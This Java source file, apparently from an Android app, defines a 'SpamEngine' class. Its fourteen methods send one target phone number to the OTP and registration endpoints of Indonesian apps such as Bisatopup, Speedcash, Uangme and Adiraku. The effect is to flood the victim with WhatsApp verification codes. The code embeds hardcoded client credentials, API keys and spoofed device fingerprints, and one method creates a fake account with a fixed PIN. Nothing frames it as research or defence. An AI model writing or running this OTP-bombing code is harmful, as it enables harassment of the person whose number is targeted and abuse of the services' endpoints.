package com.rudy.spam;

import okhttp3.*;
import java.io.IOException;

public class SpamEngine {

    public interface Callback {
        void onResult(String name, boolean success);
    }

    // 1. BISATOPUP
    public static void sendBisatopup(String num, Callback cb) {
        new Thread(() -> {
            try {
                String deviceId = NetworkHelper.codex(16);
                String url = "https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=" + deviceId + "&version_name=6.12.04&version=61204";
                RequestBody body = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "phone_number=" + num);
                Response res = NetworkHelper.client.newCall(new Request.Builder().url(url).post(body).build()).execute();
                cb.onResult("Bisatopup", res.body().string().contains("OTP akan segera dikirim"));
            } catch (Exception e) { cb.onResult("Bisatopup", false); }
        }).start();
    }

    // 2. TITIPKU
    public static void sendTitipku(String num, Callback cb) {
        new Thread(() -> {
            try {
                String url = "https://titipku.tech/v1/mobile/auth/otp?method=wa";
                String json = "{\"phone_number\":\"+62" + num + "\",\"message_placeholder\":\"hehe\"}";
                Response res = NetworkHelper.client.newCall(new Request.Builder().url(url).post(RequestBody.create(MediaType.parse("application/json"), json)).build()).execute();
                cb.onResult("Titipku", "otp sent".equals(NetworkHelper.fetchValue(res.body().string(), "\"message\":\"", "\",\"")));
            } catch (Exception e) { cb.onResult("Titipku", false); }
        }).start();
    }

    // 3. JOGJAKITA
    public static void sendJogjakita(String num, Callback cb) {
        new Thread(() -> {
            try {
                String tokenUrl = "https://aci-user.bmsecure.id/oauth/token";
                String tokenPayload = "grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1";
                Response tokenRes = NetworkHelper.client.newCall(new Request.Builder().url(tokenUrl).post(RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), tokenPayload))
                        .addHeader("Authorization", "Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==")
                        .addHeader("User-Agent", "okhttp/4.10.0").build()).execute();
                String auth = NetworkHelper.fetchValue(tokenRes.body().string(), "{\"access_token\":\"", "\",\"");
                if (auth == null || auth.isEmpty()) { cb.onResult("Jogjakita", false); return; }

                String otpUrl = "https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send";
                String otpJson = "{\"phone_user\":\"" + num + "\",\"primary_credential\":{\"device_id\":\"\",\"fcm_token\":\"\",\"id_kota\":0,\"id_user\":0,\"location\":\"0.0,0.0\",\"uuid\":\"\",\"version_code\":\"501\",\"version_name\":\"6.10.1\",\"via\":\"jogjakita_user\"},\"uuid\":\"00000000-4c22-250d-3006-9a465f072739\",\"version_code\":\"501\",\"version_name\":\"6.10.1\",\"via\":\"jogjakita_user\"}";                Response otpRes = NetworkHelper.client.newCall(new Request.Builder().url(otpUrl).post(RequestBody.create(MediaType.parse("application/json; charset=UTF-8"), otpJson))
                        .addHeader("Authorization", "Bearer " + auth).build()).execute();
                cb.onResult("Jogjakita", "200".equals(NetworkHelper.fetchValue(otpRes.body().string(), "{\"rc\":", "\",\"")));
            } catch (Exception e) { cb.onResult("Jogjakita", false); }
        }).start();
    }

    // 4. CANDIRELOAD
    public static void sendCandireload(String num, Callback cb) {
        new Thread(() -> {
            try {
                String url = "https://app.candireload.com/apps/v8/users/req_otp_register_wa";
                String json = "{\"uuid\":\"b787045b140c631f\",\"phone\":\"" + num + "\"}";
                Response res = NetworkHelper.client.newCall(new Request.Builder().url(url).post(RequestBody.create(MediaType.parse("application/json"), json))
                        .addHeader("irsauth", "c6738e934fd7ed1db55322e423d81a66").build()).execute();
                cb.onResult("Candireload", "true".equals(NetworkHelper.fetchValue(res.body().string(), "{\"success\":", "\",\"")));
            } catch (Exception e) { cb.onResult("Candireload", false); }
        }).start();
    }

    // 5. SPEEDCASH
    public static void sendSpeedcash(String num, Callback cb) {
        new Thread(() -> {
            try {
                String tokenUrl = "https://sofia.bmsecure.id/central-api/oauth/token";
                Response tokenRes = NetworkHelper.client.newCall(new Request.Builder().url(tokenUrl).post(RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "grant_type=client_credentials"))
                        .addHeader("Authorization", "Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==").build()).execute();
                String auth = NetworkHelper.fetchValue(tokenRes.body().string(), "access_token\":\"", "\",\"");
                if (auth == null || auth.isEmpty()) { cb.onResult("Speedcash", false); return; }

                String uuid = NetworkHelper.codex(8);
                String otpUrl = "https://sofia.bmsecure.id/central-api/sc-api/otp/generate";
                String otpJson = "{\"version_name\":\"6.2.1 (428)\",\"phone\":\"" + num + "\",\"appid\":\"SPEEDCASH\",\"version_code\":428,\"location\":\"0,0\",\"state\":\"REGISTER\",\"type\":\"WA\",\"app_id\":\"SPEEDCASH\",\"uuid\":\"00000000-4c22-250d-ffff-ffff" + uuid + "\",\"via\":\"BB ANDROID\"}";
                Response otpRes = NetworkHelper.client.newCall(new Request.Builder().url(otpUrl).post(RequestBody.create(MediaType.parse("application/json"), otpJson))
                        .addHeader("Authorization", "Bearer " + auth).build()).execute();
                cb.onResult("Speedcash", "00".equals(NetworkHelper.fetchValue(otpRes.body().string(), "\"rc\":\"", "\",\"")));
            } catch (Exception e) { cb.onResult("Speedcash", false); }
        }).start();
    }

    // 6. KERBEL
    public static void sendKerbel(String num, Callback cb) {
        new Thread(() -> {
            try {
                String url = "https://keranjangbelanja.co.id/api/v1/user/otp";
                String boundary = "--dio-boundary-0879576676";
                String body = boundary + "\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n" + num + "\r\n" + boundary + "\r\ncontent-disposition: form-data; name=\"otp\"\r\n\r\n118872\r\n" + boundary + "--";
                Response res = NetworkHelper.client.newCall(new Request.Builder().url(url).post(RequestBody.create(MediaType.parse("multipart/form-data; boundary=" + boundary), body)).build()).execute();
                cb.onResult("Kerbel", "OTP Berhasil Dikirimkan".equals(NetworkHelper.fetchValue(res.body().string(), "\"result\":\"", "\",\"")));
            } catch (Exception e) { cb.onResult("Kerbel", false); }        }).start();
    }

    // 7. MITRADELTA
    public static void sendMitradelta(String num, Callback cb) {
        new Thread(() -> {
            try {
                String url = "https://irsx.mitradeltapulsa.com:8080/appirsx/appapi.dll/otpreg?phone=" + num;
                Response res = NetworkHelper.client.newCall(new Request.Builder().url(url).get().build()).execute();
                cb.onResult("Mitradelta", "true".equals(NetworkHelper.fetchValue(res.body().string(), "{\"success\":", "\",\"")));
            } catch (Exception e) { cb.onResult("Mitradelta", false); }
        }).start();
    }

    // 8. AGENPAYMENT
    public static void sendAgenpayment(String num, Callback cb) {
        new Thread(() -> {
            try {
                String registerUrl = "https://agenpayment-app.findig.id/api/v1/user/register";
                String registerJson = "{\"name\":\"AAD\",\"phone\":\"" + num + "\",\"email\":\"" + num + "@gmail.com\",\"pin\":\"1111\",\"id_propinsi\":\"5e5005024d44ff5409347111\",\"id_kabupaten\":\"5e614009360fed7c1263fdf6\",\"id_kecamatan\":\"5e614059360fed7c12653764\",\"alamat\":\"aceh\",\"nama_toko\":\"QUARD\",\"alamat_toko\":\"aceh\"}";
                Response registerRes = NetworkHelper.client.newCall(new Request.Builder().url(registerUrl).post(RequestBody.create(MediaType.parse("application/json; charset=utf-8"), registerJson))
                        .addHeader("merchantcode", "63d22a4041d6a5bc8bfdb3be").build()).execute();
                if (!"200".equals(NetworkHelper.fetchValue(registerRes.body().string(), "{\"status\":", "\",\""))) { cb.onResult("Agenpayment", false); return; }

                String loginUrl = "https://agenpayment-app.findig.id/api/v1/user/login";
                String loginJson = "{\"phone\":\"" + num + "\",\"pin\":\"1111\"}";
                Response loginRes = NetworkHelper.client.newCall(new Request.Builder().url(loginUrl).post(RequestBody.create(MediaType.parse("application/json; charset=utf-8"), loginJson))
                        .addHeader("merchantcode", "63d22a4041d6a5bc8bfdb3be").build()).execute();
                String auth = NetworkHelper.fetchValue(loginRes.body().string(), "validate_id\":\"", "\",");
                if (auth == null || auth.isEmpty()) { cb.onResult("Agenpayment", false); return; }

                String otpUrl = "https://agenpayment-app.findig.id/api/v1/user/login/send-otp";
                String otpJson = "{\"codeLength\":4,\"validate_id\":\"" + auth + "\",\"type\":\"whatsapp\"}";
                Response otpRes = NetworkHelper.client.newCall(new Request.Builder().url(otpUrl).post(RequestBody.create(MediaType.parse("application/json; charset=utf-8"), otpJson))
                        .addHeader("merchantcode", "63d22a4041d6a5bc8bfdb3be").build()).execute();
                cb.onResult("Agenpayment", "200".equals(NetworkHelper.fetchValue(otpRes.body().string(), "{\"status\":", "\",\"")));
            } catch (Exception e) { cb.onResult("Agenpayment", false); }
        }).start();
    }

    // 9. Z4RELOAD
    public static void sendZ4reload(String num, Callback cb) {
        new Thread(() -> {
            try {
                String url = "https://api.irmastore.id/apps/otp/v2/sendotpwa";
                String json = "{\"hp\":\"" + num + "\",\"uuid\":\"MyT2H1xFo2WHoMT5gjdo3W9woys1\",\"app_code\":\"z4reload\"}";
                Response res = NetworkHelper.client.newCall(new Request.Builder().url(url).post(RequestBody.create(MediaType.parse("application/json"), json))
                        .addHeader("authorization", "7117c8f459a98282c2c576b519d0662f").build()).execute();
                cb.onResult("Z4Reload", "true".equals(NetworkHelper.fetchValue(res.body().string(), "{\"success\":", "\",\"")));
            } catch (Exception e) { cb.onResult("Z4Reload", false); }        }).start();
    }

    // 10. SINGA
    public static void sendSinga(String num, Callback cb) {
        new Thread(() -> {
            try {
                String url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=";
                String json = "{\"mobile_phone\":\"" + num + "\",\"type\":\"mobile\",\"is_switchable\":1}";
                Response res = NetworkHelper.client.newCall(new Request.Builder().url(url).post(RequestBody.create(MediaType.parse("application/json; charset=utf-8"), json)).build()).execute();
                cb.onResult("Singa", "Success".equals(NetworkHelper.fetchValue(res.body().string(), "\"msg\":\"", "\",\"")));
            } catch (Exception e) { cb.onResult("Singa", false); }
        }).start();
    }

    // 11. KTAKILAT
    public static void sendKtakilat(String num, Callback cb) {
        new Thread(() -> {
            try {
                String url = "https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode";
                String json = "{\"mobileNo\":\"" + num + "\",\"smsType\":1}";
                Response res = NetworkHelper.client.newCall(new Request.Builder().url(url).post(RequestBody.create(MediaType.parse("application/json; charset=UTF-8"), json))
                        .addHeader("Device-Info", "eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0=").build()).execute();
                cb.onResult("KtaKilat", "success".equals(NetworkHelper.fetchValue(res.body().string(), "\"msg\":\"", "\",\"")));
            } catch (Exception e) { cb.onResult("KtaKilat", false); }
        }).start();
    }

    // 12. UANGME
    public static void sendUangme(String num, Callback cb) {
        new Thread(() -> {
            try {
                String aid = "gaid_15497a9b-2669-42cf-ad10-" + NetworkHelper.codex(12);
                String url = "https://api.uangme.com/api/v2/sms_code?phone=" + num + "&scene_type=login&send_type=wp";
                Response res = NetworkHelper.client.newCall(new Request.Builder().url(url).get()
                        .addHeader("aid", aid).addHeader("android_id", "b787045b140c631f").addHeader("app_version", "300504")
                        .addHeader("brand", "samsung").addHeader("carrier", "00").addHeader("Content-Type", "application/x-www-form-urlencoded")
                        .addHeader("country", "510").addHeader("dfp", "6F95F26E1EEBEC8A1FE4BE741D826AB0")
                        .addHeader("fcm_reg_id", "frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo")
                        .addHeader("gaid", "gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0").addHeader("lan", "in_ID").addHeader("model", "SM-G965N")
                        .addHeader("ns", "wifi").addHeader("os", "1").addHeader("timestamp", "1732178536").addHeader("tz", "Asia%2FBangkok")
                        .addHeader("User-Agent", "okhttp/3.12.1").addHeader("v", "1").addHeader("version", "28").build()).execute();
                cb.onResult("Uangme", "200".equals(NetworkHelper.fetchValue(res.body().string(), "{\"code\":\"", "\",\"")));
            } catch (Exception e) { cb.onResult("Uangme", false); }
        }).start();
    }

    // 13. CAIRIN
    public static void sendCairin(String num, Callback cb) {
        new Thread(() -> {            try {
                String uuid = NetworkHelper.codex(32);
                String url = "https://app.cairin.id/v2/app/sms/sendWhatAPPOPT";
                String body = "appVersion=3.0.4&phone=" + num + "&userImei=" + uuid;
                Response res = NetworkHelper.client.newCall(new Request.Builder().url(url).post(RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), body)).build()).execute();
                cb.onResult("Cairin", "{\"code\":\"0\"}".equals(res.body().string().trim()));
            } catch (Exception e) { cb.onResult("Cairin", false); }
        }).start();
    }

    // 14. ADIRAKU
    public static void sendAdiraku(String num, Callback cb) {
        new Thread(() -> {
            try {
                String url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata";
                String json = "{\"mobileNumber\":\"" + num + "\",\"type\":\"prospect-create\",\"channel\":\"whatsapp\"}";
                Response res = NetworkHelper.client.newCall(new Request.Builder().url(url).post(RequestBody.create(MediaType.parse("application/json; charset=utf-8"), json))
                        .addHeader("User-Agent", "okhttp/4.9.0").build()).execute();
                cb.onResult("Adiraku", "success".equals(NetworkHelper.fetchValue(res.body().string(), "\"message\":\"", "\",\"")));
            } catch (Exception e) { cb.onResult("Adiraku", false); }
        }).start();
    }
}